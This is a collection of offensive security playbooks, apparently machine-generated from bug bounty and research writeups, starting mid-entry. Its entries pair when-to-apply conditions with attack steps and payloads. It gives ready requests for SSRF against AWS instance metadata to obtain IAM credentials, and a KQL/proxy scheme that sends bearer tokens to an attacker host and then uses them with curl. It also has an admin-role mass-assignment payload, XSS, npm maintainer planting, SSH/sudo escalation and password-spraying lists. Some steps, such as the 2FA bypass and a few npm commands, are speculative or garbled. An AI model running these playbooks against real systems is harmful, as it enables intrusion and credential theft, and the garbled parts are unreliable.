playbooks.impact: An attacker can take over any user's session on a Service Provider that trusts the vulnerable JetBrains Hub as its SAML IdP, allowing the attacker to impersonate the user and perform any actions they could perform.
playbooks.key_lesson: When a SAML IdP is integrated with OAuth2 for authorization code exchange, verify that the IdP properly validates the originating client and scope during the exchange to prevent unauthorized token issuance.

meta.title: Exploitation of an SSRF vulnerability against EC2 IMDSv2

trigger_conditions.when_to_apply: When an authenticated user can trigger a request to an external URL via the Confluence makeRequest gadget, and the target environment is AWS EC2 with IMDSv2 enabled.
prerequisites: Target is running on AWS EC2 infrastructure.
Target uses Atlassian Confluence.
The `/plugins/servlet/gadgets/makeRequest` endpoint is accessible and vulnerable to SSRF.
The target EC2 instance is configured to use IMDSv2.
Attacker has an authenticated session on Confluence.
applicability_signals: Existence of the `/plugins/servlet/gadgets/makeRequest` endpoint.
The `makeRequest` gadget allows specifying `httpmethod`, `postData`, and `headers` parameters.
Initial SSRF via `makeRequest` successfully triggers an external interaction (e.g., Burp Collaborator ping).
skip_if: IMDSv1 is in use (direct access to metadata endpoint without authentication).
WAF blocks requests to `http://169.254.169.254` even with correct IMDSv2 headers.
The `makeRequest` gadget does not support controlling HTTP methods or headers.

recon_steps: Step 1: Identify Atlassian Confluence instances within the target's subdomains using passive and active reconnaissance.
Step 2: Test the `/plugins/servlet/gadgets/makeRequest` endpoint for SSRF by sending a request to a Burp Collaborator (or similar out-of-band interaction tool) URL.
Step 3: Confirm if the target host is running on AWS infrastructure (e.g., by observing typical AWS IP ranges or metadata behavior).
attack_steps: Step 1: Send a PUT request to `http://169.254.169.254/latest/api/token` with the header `X-aws-ec2-metadata-token-ttl-seconds: 21600` via the vulnerable Confluence `makeRequest` gadget. This requires crafting a POST request to `/plugins/servlet/gadgets/makeRequest` with appropriate parameters to pass the PUT request and headers.
Step 2: Parse the response to extract the session token obtained in Step 1.

Step 3: Send a GET request to `http://169.254.169.254/latest/meta-data/` (or a more specific endpoint like `profile` or `iam/security-credentials/role-name`) with the extracted session token in the `X-aws-ec2-metadata-token` header, again via the `makeRequest` gadget. This will require crafting another POST request to `/plugins/servlet/gadgets/makeRequest`.
payloads_or_patterns:
# Step 1 Payload for generating IMDSv2 token:
POST /plugins/servlet/gadgets/makeRequest HTTP/1.1
Host: <TARGET_URL_HOST>
User-Agent: Mozilla/5.0
Accept: */*
X-Atlassian-Token: no-check
Content-Type: application/x-www-form-urlencoded

gadgets=your_gadget_name&url=http://169.254.169.254/latest/api/token&httpMethod=PUT&headers=X-aws-ec2-metadata-token-ttl-seconds%3A%2021600

# Step 3 Payload for retrieving metadata (e.g., IAM role credentials):
POST /plugins/servlet/gadgets/makeRequest HTTP/1.1
Host: <TARGET_URL_HOST>
User-Agent: Mozilla/5.0
Accept: */*
X-Atlassian-Token: no-check
Content-Type: application/x-www-form-urlencoded

gadgets=your_gadget_name&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>&httpMethod=GET&headers=X-aws-ec2-metadata-token%3A%20<SESSION_TOKEN>
tools_recommended: Burp Suite: For crafting and sending the POST requests to the Confluence `makeRequest` endpoint, and for parsing responses.
Burp Collaborator: To confirm the SSRF vulnerability and for initial out-of-band interaction.
success_indicators: Successful retrieval of a session token in the response from the PUT request to `/latest/api/token`.
Successful retrieval of AWS instance metadata (e.g., IAM role name, access keys, secret keys, session tokens) in the response from the GET request to a metadata endpoint.
failure_indicators: 401 Unauthorized error when trying to access `/latest/api/token` (indicates IMDSv2 is likely not exploitable in this manner or the request is malformed).
500 Internal Server Error or other unexpected errors from the `makeRequest` endpoint.
No session token returned in the response.
No metadata is returned or an error is returned when trying to fetch metadata using the session token.
If the target is not on AWS, the IP address `169.254.169.254` will not be reachable or will return errors.

playbooks.impact: Attacker can exfiltrate AWS EC2 instance metadata, including sensitive information such as IAM role credentials. This can lead to unauthorized access to other AWS resources, data breaches, privilege escalation, and full compromise of the AWS environment associated with the compromised instance.
playbooks.key_lesson: When encountering SSRF vulnerabilities in web applications deployed on cloud infrastructure (especially AWS), always investigate the possibility of reaching the instance metadata service endpoint (`169.254.169.254`) and be aware of IMDSv2 authentication requirements. Leverage controllable HTTP methods and headers in the SSRF vulnerability to bypass IMDSv2 defenses.

meta.title: ExtraReplica— a cross-account database vulnerability in Azure PostgreSQL
meta.authors: Ronen Shustin, Sagi Tzadik, Nir Ohfeld, Shir Tamari

target_profile.technology: Azure Database for PostgreSQL Flexible Server
affected_components: PostgreSQL Flexible Server instances (excluding those with VNet Private Access)
target_profile.required_access_level: any_authenticated_user (with code execution capability on their own instance)
tech_stack_fingerprints: Azure service endpoint for PostgreSQL Flexible Server

trigger_conditions.when_to_apply: When an attacker can achieve code execution on their own Azure PostgreSQL Flexible Server instance and the target database is not configured with VNet Private Access.
prerequisites: Attacker must be able to execute code on their own Azure PostgreSQL Flexible Server instance.
Target PostgreSQL Flexible Server must not be using VNet Private Access.
applicability_signals: Existence of Azure PostgreSQL Flexible Server service.
Identified vulnerability allowing code execution on own PostgreSQL Flexible Server instance (as per research writeup).
Observation that target PostgreSQL instances are not using VNet Private Access.
skip_if: Target PostgreSQL Flexible Server instances are exclusively configured with VNet Private Access.
No mechanism to gain code execution on a self-owned PostgreSQL Flexible Server instance is available.

recon_steps: Step 1: Identify Azure PostgreSQL Flexible Server instances within the same subnet as the attacker's controlled instance.
Step 2: Utilize certificate transparency feeds to discover other PostgreSQL Flexible Server instances and their associated domains.
attack_steps: Step 1: Exploit a vulnerability within Azure's PostgreSQL Flexible Server service to gain code execution on the attacker's own PostgreSQL Flexible Server instance.
Step 2: Perform network reconnaissance from the compromised instance to discover other customer instances in the same subnet.
Step 3: Identify the over-permissive regular expression validation for the certificate's Common Name (CN) on the target PostgreSQL Flexible Server.
Step 4: Issue a self-signed certificate with a Common Name matching a target domain (e.g., replication.<target_db_id>.database.azure.com.<attacker_controlled_domain>).
Step 5: Use the issued certificate to connect to the target PostgreSQL instance, leveraging the weak regex validation.
Step 6: Replicate the target PostgreSQL database to the attacker's controlled instance, gaining read access.
payloads_or_patterns: Regex for CN validation: /^(.*?)\.eee03a2acfe6\.database\.azure\.com (.*) $/
Example certificate CN: replication.<TARGET_DB_ID>.database.azure.com.<ATTACKER_CONTROLLED_DOMAIN>
tools_recommended: Custom scripts for code execution on PostgreSQL Flexible Server.
Tools for certificate generation and management (e.g., OpenSSL).
Network scanning tools (e.g., nmap) for internal subnet reconnaissance.
Certificate Transparency log parsers.
success_indicators: Successful connection to a target PostgreSQL database using a certificate issued to an arbitrary domain.
Ability to replicate data from a target PostgreSQL database owned by a different tenant.
Response indicating successful database replication or data retrieval from the target database.
failure_indicators: Connection denied when attempting to use the crafted certificate → Indicates the regex validation might have been updated or is not exploitable as described.
No network discoverability of other PostgreSQL instances within the subnet → Suggests stronger network segmentation or different subnetting strategy is in place.

playbooks.impact: Unauthorized read access to other customers' Azure PostgreSQL Flexible Server databases, leading to data exfiltration and potential data breach.
playbooks.key_lesson: Always scrutinize certificate validation logic, especially regular expressions, as overly permissive patterns (like wildcards) can lead to authentication bypass and cross-tenant data access.

meta.title: Encrypting our way to SSRF in VMWare Workspace One UEM (CVE-2021-22054)
meta.authors: Keiran Sampson, James Hebden, Shubham Shah

tech_stack_fingerprints: web.config file found in application directories

trigger_conditions.when_to_apply: When the target application exposes a BlobHandler.ashx endpoint with an unauthenticated authorization rule, indicating it can handle arbitrary file uploads or blobs.
prerequisites: The target application must be VMWare Workspace One UEM or a similarly configured .NET application.
applicability_signals: Existence of '/BlobHandler.ashx' endpoint.
The <authorization><allow users="*" /></authorization> rule in web.config for BlobHandler.ashx.
skip_if: BlobHandler.ashx endpoint is protected by authentication.
Application does not exhibit .NET characteristics or web.config files.

recon_steps: Step 1: Scan the target application for the presence of '/BlobHandler.ashx' endpoint.
Step 2: Analyze the web.config file associated with BlobHandler.ashx to confirm the authorization rule is set to allow all users ('*').
attack_steps: Step 1: Craft a malicious file upload request to '/BlobHandler.ashx' that includes data designed to trigger SSRF.

Step 2: The exact SSRF payload requires reversing VMWare's encryption algorithm to construct a valid request body that, when processed, causes the server to make an HTTP request to an attacker-controlled URL.
Step 3: Monitor an attacker-controlled server (e.g., Burp Collaborator, ngrok) for incoming HTTP requests originating from the target.
payloads_or_patterns: Payload construction requires reversing VMWare's encryption. A generic template for the SSRF request to BlobHandler.ashx would involve sending a POST request with a specific content-type and a custom-encrypted body that includes the target URL. Example of encrypted payload structure (specifics require reverse engineering): {'encrypted_data': '<encrypted_payload_containing_ssrf_url>'}
tools_recommended: Burp Suite: To intercept and modify requests to BlobHandler.ashx.
Burp Collaborator / ngrok: To receive inbound HTTP requests for SSRF confirmation.
ILSpy or dnSpy: For reverse engineering .NET DLLs to understand the encryption algorithm.
success_indicators: Receiving an HTTP request on the attacker-controlled server (e.g., Burp Collaborator) originating from the VMWare Workspace One UEM server.
The request to the attacker-controlled server contains information that reveals the internal IP address or other internal network details of the target.
failure_indicators: No HTTP requests are received on the attacker-controlled server after attempting the exploit.
The server responds with an error indicating an invalid request format or encryption issue, suggesting the payload was not correctly constructed due to incomplete reverse engineering.

playbooks.impact: Allows an unauthenticated attacker to perform arbitrary HTTP requests from the server to any internal or external URL. This can lead to Server-Side Request Forgery (SSRF), potentially enabling attackers to access sensitive internal resources, scan internal networks, or interact with internal services.
playbooks.key_lesson: When auditing .NET applications, pay close attention to handlers like .ashx files, especially if they are exposed unauthenticated, as they may process arbitrary data and can be abused for SSRF if encryption/decryption logic is flawed or discoverable.

meta.title: Azure Monitor – Malicious KQL Query

target_profile.technology: Azure Monitor / Azure Data Explorer / Log Analytics
affected_components: Kusto Query Language (KQL) queries via the adx() method
target_profile.required_access_level: any_authenticated_user (with permission to run queries on a targetable workspace)

trigger_conditions.when_to_apply: When an attacker can execute KQL queries within Azure Monitor or Log Analytics, and has control over a resource that can intercept HTTP requests.
prerequisites: Attacker must have authenticated access to Azure Monitor/Log Analytics and be able to run KQL queries.
Attacker must control a server that can act as a Man-in-the-Middle (MITM) proxy for the Azure Data Explorer (ADX) endpoint.
applicability_signals: The target environment uses Azure Monitor and supports cross-service queries with Azure Data Explorer via the adx() method.
The adx() method allows specifying an arbitrary URL for the ADX cluster.
skip_if: The environment explicitly disallows cross-service queries or limits the functionality of the adx() operator.
A Web Application Firewall (WAF) blocks or sanitizes malicious KQL syntax.

recon_steps: Step 1: Identify target Azure Monitor workspaces and assess user permissions to run KQL queries.
Step 2: Understand the ADX proxy documentation to confirm the applicability of the adx() operator and its parameters.
attack_steps: Step 1: Set up a MITM proxy server (e.g., using Node.js with Express and Axios) to intercept requests to an Azure Data Explorer cluster endpoint.
Step 2: Configure the proxy to log and store the 'Authorization: Bearer <token>' header from incoming requests.
Step 3: Craft a KQL query that uses the adx() operator, pointing the ADX cluster URL to the attacker's MITM proxy.
Step 4: Execute the crafted KQL query from the compromised Azure Monitor/Log Analytics environment.
Step 5: The MITM proxy will intercept the request, capture the JWT access token, and relay a dummy response.
Step 6: Use the captured access token in a separate request to exfiltrate data from the target workspace (e.g., using `curl` with the stolen token).
payloads_or_patterns: KQL Query: `externaldata(url:string, credential:dynamic) [ "<MITM_PROXY_URL>" ] | ...` (The exact query depends on what data needs to be exfiltrated after the token is captured, but the `externaldata` or `adx()` operator is key for exfiltrating the token)

Curl Command Template: `curl "https://ade.loganalytics.io/<TARGET_WORKSPACE_RESOURCE_ID>/v2/rest/query" \ -H "authorization: Bearer <SESSION_TOKEN>" \ -H 'content-type: application/json; charset=UTF-8' \ -H 'accept: application/json' \ --data-raw '{"db":"<TARGET_WORKSPACE_NAME>","csl":"SigninLogs\r\n| take 10","properties":{"Options":{"servertimeout":"00:04:00","queryconsistency":"strongconsistency","query_language":"csl","request_readonly":false,"request_readonly_hardline":false}}}' \ --compressed`
tools_recommended: Node.js with Express and Axios (for MITM proxy)
Burp Suite or similar proxy for initial analysis
curl (for exfiltrating data with stolen token)
success_indicators: The MITM proxy server receives an incoming HTTP request containing a valid 'Authorization: Bearer <access_token>' header.
The captured access token can be successfully used to query sensitive data from the Azure Monitor workspace using a separate API call.
failure_indicators: The MITM proxy does not receive any intercepted requests when the KQL query is executed, indicating the adx() operator is not functioning as expected or is blocked.
The intercepted token is invalid or expired, requiring re-attempt with a fresh query execution.
API calls using the captured token result in 401 Unauthorized or 403 Forbidden errors, suggesting token scope limitations or immediate revocation.

playbooks.impact: An attacker can exfiltrate sensitive data from Azure Monitor workspaces, including access tokens, by tricking an authenticated user into executing a malicious KQL query. This can lead to further unauthorized access and data breaches.
playbooks.key_lesson: Always validate cross-service query functionalities, especially those allowing external data references, as they can be abused to leak authentication credentials and sensitive data.

meta.title: Privileged account creation via Mass Assignment towards a full compromise using a Stored XSS
meta.category: Stored XSS, Mass assignment, Security code review

tech_stack_fingerprints: source code analysis reveals Python/SQLAlchemy ORM usage

trigger_conditions.when_to_apply: When the application has an endpoint for creating users that directly deserializes input into a database object and then attempts to remove sensitive attributes.
prerequisites: Attacker has the ability to register an account.
applicability_signals: User creation endpoint accepts JSON payload.
Source code shows direct mapping of request JSON to a database model object (e.g., `new_user = User(from_dict=request.json)`).
The code explicitly removes sensitive roles/attributes *after* object creation from user input.
skip_if: User input is strictly validated against an allowlist before object creation.
All sensitive attributes are explicitly set by the server and not derived from user input.

recon_steps: Step 1: Analyze the source code for user creation endpoints, specifically looking for patterns of direct deserialization of request data into model objects.
Step 2: Identify user roles or privileged attributes that can be set.
Step 3: Examine the code to see if sensitive attributes are removed or modified *after* initial deserialization from the user input.
attack_steps: Step 1: Craft a JSON payload for the `/users/signup/webapp` endpoint. Include a role that is normally restricted, such as 'ADMIN', within the payload's 'roles' array.
Step 2: Send the crafted POST request to `/users/signup/webapp` with the malicious payload. Observe the response.
Step 3: If the account creation is successful and the 'ADMIN' role is present in the created user's roles (or isAdmin becomes true), log in with the newly created account.
Step 4: Navigate to the administration panel (if accessible with the new admin role).
Step 5: Identify an input field or parameter within the admin panel that renders user-supplied content (e.g., description fields, profile bios, message boards).
Step 6: Inject a Stored XSS payload into this identified field. Example: `<script>alert(document.domain)</script>`
Step 7: Save the content containing the XSS payload.
Step 8: Observe if an administrator account, upon viewing the content with the payload, executes the JavaScript.
payloads_or_patterns:
POST /users/signup/webapp
Content-Type: application/json

{
  "email": "attacker@example.com",
  "password": "securepassword123",
  "roles": ["ADMIN"], 
  "isEmailValidated": true,
  "needsToFillCulturalSurvey": false,
  "hasSeenTutorials": true
}
<script>alert('XSS')</script>
tools_recommended: Burp Suite: To intercept and modify requests, craft JSON payloads, and spider for input fields.
Source code analysis tools: To understand the deserialization and attribute handling logic.
success_indicators: User account created with 'ADMIN' role and/or `isAdmin` flag set to true, confirmed by inspecting the user object or attempting admin panel access.
An administrator viewing content containing the injected script executes the JavaScript (e.g., an alert box appears).
failure_indicators: Mass assignment fails: The 'ADMIN' role is stripped correctly, or account creation fails with a validation error. Pivot: Look for other parameters that might be subject to mass assignment or other vulnerabilities.
Stored XSS fails: The injected script is sanitized or not rendered. Pivot: Try different XSS payloads, look for other rendering contexts in the admin panel, or explore alternative injection vectors.

playbooks.impact: Attacker gains administrative privileges by creating a privileged account via mass assignment. From this privileged account, a stored XSS payload can be injected into the admin panel, which, when viewed by an administrator, can lead to full account compromise, session hijacking, or execution of arbitrary actions on behalf of the administrator.
playbooks.key_lesson: When deserializing user input into objects, ensure all sensitive attributes are explicitly set by the server or are strictly validated against an allowlist. Relying on removing forbidden attributes post-deserialization is error-prone and can lead to mass assignment vulnerabilities.

meta.title: Package Planting: Are You [Unknowingly] Maintaining Poisoned Packages?

trigger_conditions.when_to_apply: When the npm package management system allows adding users as maintainers without their explicit consent or a confirmation mechanism.
prerequisites: Attacker can publish an npm package.
applicability_signals: The ability to add arbitrary npm users as maintainers of a newly created package.
Absence of an email invitation or confirmation step for new maintainers.
skip_if: npm implements a mandatory confirmation step (e.g., email invitation) for adding new maintainers.

recon_steps: Step 1: Inspect the npm documentation or past behavior to understand how maintainers are added to packages.
Step 2: Attempt to create a new npm package and observe the maintainer addition process for any consent requirements.
attack_steps: Step 1: Create a malicious npm package.
Step 2: Add well-known and trusted npm users (e.g., maintainers of popular packages like 'lodash') as maintainers of the malicious package.
Step 3: Remove the attacker's own account from the package's maintainers, leaving the trusted users as the apparent owners.
Step 4: (Optional) Report the package or the compromised accounts to npm or security researchers to achieve defamation or other malicious goals.
payloads_or_patterns: npm publish <malicious_package_name> --owner <trusted_user_id>
npm owner add <trusted_user_id> <malicious_package_name>
tools_recommended: npm CLI: for publishing packages and managing owners.
success_indicators: Trusted users appear as maintainers of the attacker-controlled malicious package without their knowledge or consent.
Subsequent downloads or usage of the malicious package by developers who trust the listed maintainers.
failure_indicators: npm CLI returns an error indicating that maintainer addition requires confirmation or is restricted.
The trusted user receives an invitation and must explicitly accept it, preventing the automated addition.

playbooks.impact: Allows attackers to masquerade malicious packages as legitimate by associating them with trusted developers or organizations, leading to widespread adoption of poisoned code. Can also be used for developer defamation by implicating them in malicious activities.
playbooks.key_lesson: Verify that package management systems implement explicit consent and confirmation mechanisms for adding collaborators or maintainers to prevent unauthorized associations with malicious content.

meta.title: How I Bypassed 2FA while Resetting Password

trigger_conditions.when_to_apply: When a user initiates the password reset flow and the application redirects to a 2FA page after setting a new password.
prerequisites: Attacker must have an existing account on the target application.
Attacker must be able to initiate the password reset process for their own account.
applicability_signals: Password reset link is generated and accessible.
After setting a new password, the application prompts for 2FA.
The presence of a '/reset2fa' endpoint or similar during the password reset process.
skip_if: Password reset process completes without any 2FA prompt.
The application does not have a distinct step for 2FA verification after password reset.

recon_steps: Step 1: Initiate the password reset process for an authenticated account.
Step 2: Observe the redirection and subsequent steps, noting any 2FA prompts.
Step 3: Capture the requests made during the password reset process, especially after setting the new password, using a proxy like Burp Suite.
Step 4: Compare the captured requests with 2FA enabled and disabled on the account, if possible, to identify differences.
attack_steps: Step 1: Send a POST request to the '/reset2fa' endpoint (or equivalent) with the password reset token, reset key, and the new password. The request should include CSRF tokens as observed.
Step 2: Analyze the response from the '/reset2fa' request. The writeup implies this step might redirect to a 2FA page, indicating failure to bypass.

Step 3: The writeup does not detail the successful bypass steps, only the initial observation that forwarding the request to '/reset2fa' redirected to the 2FA page. Further investigation would be needed to identify how the 2FA step was bypassed.

Step 4: A potential avenue for bypass, not detailed in the writeup, would be to try sending the password reset request without the 2FA verification step if the application allows it or if there's a logic flaw in handling the reset token and new password combination before the 2FA check.
payloads_or_patterns:
POST /reset2fa HTTP/1.1
Host: abc.target.com
...
_csrf=<token>&reset_key=<key>&password=Test@123
tools_recommended: Burp Suite: To capture and forward HTTP requests, analyze request/response differences.
success_indicators: Successful password change without requiring 2FA code entry.
Ability to log in with the new password immediately after the reset process, without 2FA.
failure_indicators: Redirection to the 2FA verification page after submitting the new password.
4xx or 5xx error responses from the '/reset2fa' endpoint.
Password not being updated successfully.

playbooks.impact: An attacker could change a user's password without completing the two-factor authentication, leading to full account takeover.
playbooks.key_lesson: Analyze the request flow during password reset, especially when 2FA is involved, and compare requests when 2FA is enabled versus disabled to identify potential bypass logic.

meta.title: Adventures Into The MeowCorp Bug Bounty Program
meta.vuln_type: RCE | Credential Leak | NFS Misconfiguration | Docker Hub Account Takeover | SQLi

tech_stack_fingerprints: Shodan search results for MeowCorp assets

trigger_conditions.when_to_apply: When subdomain enumeration reveals potentially exposed git repositories or when accessing MeowCorp's GitHub organization reveals user contributions or repository details.
prerequisites: Access to tools for subdomain enumeration (e.g., Amass, Subfinder)
Access to tools for git repository analysis (e.g., GitTools)
Access to network scanning tools (e.g., Nmap, Showmount)
Access to Shodan for asset discovery
Access to credential spraying techniques
applicability_signals: Discovery of a .git directory on a target subdomain (e.g., api.scan.meowcorp.io)
MeowCorp GitHub organization or user repositories with commit history
Open port 2049 (NFS) on MeowCorp infrastructure
Publicly accessible MeowCorp assets found via Shodan
Existence of common database ports (MySQL, PostgreSQL, Redis) on MeowCorp infrastructure
skip_if: No public subdomains are discoverable or all found subdomains are properly secured without exposed .git directories.
MeowCorp's GitHub presence is minimal or uses private repositories exclusively.
No open NFS ports are found on MeowCorp infrastructure.
Shodan search yields no MeowCorp related assets or discovered assets are firewalled.
All common database ports are closed or require complex authentication mechanisms not readily bypassable.

recon_steps: Step 1: Perform subdomain enumeration for meowcorp.io and its related domains to identify potential API endpoints or exposed services.
Step 2: If a .git directory is found on any subdomain (e.g., api.scan.meowcorp.io), use GitTools or similar to dump the repository contents.
Step 3: Analyze the dumped git repository for sensitive information, particularly commit history pointing to personal GitHub profiles or exposed credentials.
Step 4: Investigate identified personal GitHub profiles for any relation to MeowCorp, paying close attention to public repositories and commit activity.
Step 5: Analyze MeowCorp's official GitHub organization and contributing users' profiles for leaked credentials, configuration files, or sensitive data.
Step 6: Perform a full port scan (Nmap) on discovered MeowCorp IP addresses, looking for services like NFS (port 2049).
Step 7: If NFS is found, use 'showmount' to list available shares and attempt to mount them.
Step 8: Use Shodan to search for MeowCorp assets and identify open ports, specifically looking for database ports (MySQL, PostgreSQL, Redis) or other vulnerable services.
Step 9: Collect potential credentials from GitHub, dehashed, and other sources to use for password spraying.
attack_steps: Step 1: If SSH credentials are leaked in git history (e.g., in CICD.yml), attempt to SSH into the compromised host using the extracted credentials. Check 'sudo -l' for elevated privileges.
Step 2: If NFS shares are discovered, mount the accessible share (e.g., '/data/share' to '/tmp/test') and search for sensitive configuration files (e.g., config.json in a portainer directory).
Step 3: If a config.json file with base64 encoded Docker Hub credentials is found, decode the credentials and attempt to log in to Docker Hub.
Step 4: If database credentials (e.g., MongoDB, MySQL) are found in GitHub repositories or other leaked sources, attempt to log in to the respective databases.
Step 5: If logged into a MySQL database, examine tables like 'emailVerification' for sensitive user data (email, user ID, verification code).
payloads_or_patterns: GitTools usage: python GitTools.py dump /path/to/.git
SSH command: ssh <redacted-user>@<host_ip>
Sudo command: sudo -l
Sudo root escalation: sudo su -
NFS mount command: sudo mount -t nfs <nfs_server_ip>:/data/share /tmp/test/
Base64 decode for Docker Hub: echo "<base64_encoded_credentials>" | base64 -d
MySQL login (example): mysql -h <db_host> -u root -p meowcorp2021
Credential spraying passwords: meowcorp123, meowcorp2020, meowcorp2021, meowcorp2022, Fname123, fname.lastname123
tools_recommended: Amass / Subfinder: For subdomain enumeration
GitTools: For dumping git repositories
Nmap: For port scanning
Showmount: For enumerating NFS shares
Burp Suite / OWASP ZAP: For analyzing HTTP traffic and identifying potential web vulnerabilities
SSH client: For remote login
Docker CLI: For interacting with Docker Hub
MySQL client: For database interaction
Shodan CLI/Website: For asset discovery
success_indicators: Successful SSH login to a server, confirmed by 'whoami' command.
Ability to execute 'sudo su -' and achieve root privileges.
Successfully mounting an NFS share and accessing its contents.
Successful login to a Docker Hub account using decoded credentials.
Successful login to a MySQL database and ability to query sensitive tables (e.g., 'emailVerification').
Discovery of sensitive data within mounted NFS shares or accessed databases.
failure_indicators: SSH login attempts fail due to incorrect credentials or host unreachable (pivot: check for other leaked credentials or services).
NFS mount attempts fail due to incorrect share path or no permission (pivot: search for other network shares or misconfigurations).
Docker Hub login fails with invalid credentials (pivot: re-verify decoding, look for alternative authentication methods).
Database login fails with incorrect credentials or port closed (pivot: try alternative credentials, scan for other database types).
403 Forbidden or similar errors when attempting to access sensitive files or data after successful login (pivot: check for specific file permissions or data access controls).

playbooks.impact: Remote Code Execution (RCE) via SSH access and sudo privileges, unauthorized access to employee's Docker Hub account leading to potential supply chain attacks or data theft, access to sensitive user data (email, verification codes) from a production MySQL database, unauthorized access to internal file shares via NFS.
playbooks.key_lesson: Routinely scan for exposed .git directories and analyze GitHub commit history for leaked credentials or sensitive information. Always check for NFS shares and attempt to mount them for potential data leakage. Leverage Shodan for asset discovery and credential spraying against common database services.

meta.title: Security issues with cloudflare/odoh-server-go and the ODoH RFC draft

tech_stack_fingerprints: Likely deployed on infrastructure accessible by Cloudflare partners

trigger_conditions.when_to_apply: When an ODoH relay server is deployed and accepting requests, and there are no explicit checks for destination IP addresses or hostnames.
prerequisites: The ODoH server must be running and accessible.
applicability_signals: The ODoH server accepts POST/GET requests with valid Content-Type headers.
The ODoH RFC draft or implementation lacks security considerations for destination validation.
skip_if: The ODoH server explicitly validates destination URLs against an allowlist or blocklist.
The ODoH server returns errors for requests to internal IP addresses.

recon_steps: Identify an active ODoH relay server endpoint. This might be through public documentation or by observing traffic if a partner's ODoH endpoint is known.
attack_steps: Step 1: Construct a POST or GET request to the ODoH relay server.
Step 2: In the request payload or query parameters, specify a URL that points to an internal host or a sensitive external resource that the ODoH server can reach but the attacker cannot directly.
Step 3: Observe the response from the ODoH server to determine if the request was forwarded and if any information was leaked or action was taken on the target resource.
payloads_or_patterns:
POST /dns-query HTTP/1.1
Host: <ODOH_RELAY_HOST>
Content-Type: application/dns-message

<Encrypted DNS Query for a host like http://127.0.0.1:8080/admin or http://internal-api.local/status>
tools_recommended: curl for sending crafted HTTP requests.
Burp Suite or similar proxy to intercept and analyze requests/responses.
A collaborator server (e.g., Burp Collaborator) to detect blind SSRF if direct responses are not informative.
success_indicators: The ODoH server successfully forwards the request to the internal/target host.
A response from the internal host is received back through the ODoH server (even if encrypted, the presence of a response might indicate success).
A callback is received on a collaborator server if the target resource makes an outgoing connection (e.g., HTTP request, DNS lookup).
failure_indicators: The ODoH server returns an error indicating a disallowed host or IP address.
The ODoH server times out without returning a response from the target.
The ODoH server simply returns the encrypted DNS query response without attempting to reach the specified host (indicating no proxying happened).

playbooks.impact: An attacker can abuse the ODoH relay to perform Server-Side Request Forgery (SSRF) attacks, potentially accessing internal network resources, sensitive APIs, or performing actions on behalf of the ODoH server. This could lead to information disclosure, unauthorized access, or further exploitation of internal systems.
playbooks.key_lesson: Always validate and sanitize all user-supplied URLs in proxying functionality to prevent SSRF vulnerabilities, especially when dealing with sensitive infrastructure like DNS relays.

meta.title: CVE-2022-21449: Psychic Signatures in Java

tech_stack_fingerprints: Java 15, 16, 17, or 18 running without April 2022 Critical Patch Update

trigger_conditions.when_to_apply: When a target system utilizes ECDSA signatures for critical security mechanisms and is running a vulnerable version of Java.
prerequisites: Target system is running Java 15, 16, 17, or 18 prior to the April 2022 Critical Patch Update.
The target system uses ECDSA signatures for verifying JWTs, SAML assertions, OIDC id tokens, SSL certificates, handshakes, or WebAuthn authentication.
applicability_signals: Analysis of target's Java version
Knowledge of the target's use of ECDSA signatures in its security protocols
skip_if: Target system is running a patched version of Java (April 2022 CPU or later).
Target system does not use ECDSA signatures.

recon_steps: Identify target systems that are known to use Java.
Determine the specific Java version running on the target system.

Investigate if the target system relies on ECDSA signatures for any security protocols (e.g., JWT validation, SAML assertion verification, OIDC token validation, SSL/TLS certificate validation, WebAuthn authentication).
attack_steps: Step 1: Construct an ECDSA signature where both 'r' and 's' components are zero.
Step 2: Craft a malicious digital document (e.g., a JWT, SAML assertion, or certificate) signed with the forged zero 'r' and 's' signature.
Step 3: Submit the forged document to the target system for verification.
Step 4: Observe if the target system accepts the forged signature as valid.
payloads_or_patterns: A forged ECDSA signature with r=0 and s=0. The exact encoding will depend on the specific ECDSA curve and encoding format used, but the core principle is to provide values that the vulnerable Java implementation will incorrectly process as valid.
tools_recommended: Custom scripting (e.g., Python with `cryptography` library) to generate forged ECDSA signatures.
Tools for crafting and submitting JWTs, SAML assertions, or certificates.
success_indicators: The target system accepts a forged signature for an arbitrary message and public key.
Successful forging of SSL certificates, signed JWTs, SAML assertions, OIDC id tokens, or WebAuthn authentication messages.
failure_indicators: The target system rejects the forged signature.
The target system is running a patched version of Java.
The target system does not use ECDSA signatures.

playbooks.impact: An attacker can trivially bypass ECDSA signature verification mechanisms, leading to the forgery of SSL certificates (allowing Man-in-the-Middle attacks), signed JWTs, SAML assertions, OIDC id tokens, and WebAuthn authentication messages. This can result in unauthorized access, data interception, and impersonation.
playbooks.key_lesson: When targeting systems that use ECDSA signatures, verify the Java version and check for updates related to CVE-2022-21449, as a missing 'r' and 's' zero check can lead to trivial signature bypass.

meta.title: A few clarifications about CVE-2022-21449

affected_components: ECDSA signature verification in Java versions 15 and above (initially, later corrected to versions 17 and 18 due to support lifecycle)
JWT libraries that rely on vulnerable Java ECDSA implementations

trigger_conditions.when_to_apply: When target applications are using vulnerable versions of Java (17+) and processing JWTs with ECDSA signatures without proper validation.
prerequisites: Target system uses Java 17 or later.
Target system processes JWTs that are signed using ECDSA.
Target system's JWT validation does not explicitly check for specific invalid signature values.
applicability_signals: Application logs indicating JWT validation issues.
Use of older or unpatched Java versions.
Specific JWT libraries known to be vulnerable.
Application responses that can be manipulated by invalid signature values.
skip_if: Target system uses Java versions prior to 17.
Target system does not process JWTs signed with ECDSA.
Target system's JWT library has been patched or explicitly checks for all zero/invalid ECDSA signatures.

recon_steps: Identify the Java version used by the target application. This might be inferred from application headers, error messages, or through direct probing if possible.
Identify if the application utilizes JWTs for authentication or authorization.
If JWTs are used, determine the signing algorithm (e.g., ES256, ES384, ES512).
Investigate the specific JWT library and its version used by the application. Check if known vulnerable versions are in use.
Review the Oracle security advisory and known exploits for CVE-2022-21449 to understand specific problematic signature values.
Examine Project Wycheproof test vectors for ECDSA signature variations that trigger the bug.
attack_steps: Step 1: Craft a JWT with an ECDSA signature that exploits the vulnerability. This could be an all-zero signature or other specific invalid values identified in Project Wycheproof test vectors.
Step 2: Send the crafted JWT to the target application, for example, within an 'Authorization: Bearer <crafted_jwt>' header.
Step 3: Observe the application's response to determine if the crafted JWT was accepted despite the invalid signature.
